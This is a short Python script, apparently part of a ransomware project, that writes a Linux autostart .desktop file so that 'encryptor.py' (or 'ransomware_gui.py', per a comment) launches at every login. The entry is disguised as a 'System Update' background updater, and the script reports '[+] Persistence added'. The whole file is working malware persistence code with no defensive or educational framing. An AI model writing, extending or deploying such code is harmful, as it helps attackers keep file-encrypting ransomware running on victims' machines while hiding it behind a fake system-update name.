import os
import shutil

def setup_autostart():
    # Define the autostart directory
    autostart_dir = os.path.expanduser("~/.config/autostart")
    os.makedirs(autostart_dir, exist_ok=True)

    # Path to this script or the target script to autostart
    script_path = os.path.abspath("encryptor.py")  # or ransomware_gui.py if GUI only

    # Create a .desktop file to autostart it
    desktop_entry = f"""[Desktop Entry]
Type=Application
Exec=python3 {script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=System Update
Comment=Starts background updater
"""
    desktop_file = os.path.join(autostart_dir, "system_update.desktop")
    with open(desktop_file, "w") as f:
        f.write(desktop_entry)

    print(f"[+] Persistence added: {desktop_file}")

if __name__ == "__main__":
    setup_autostart()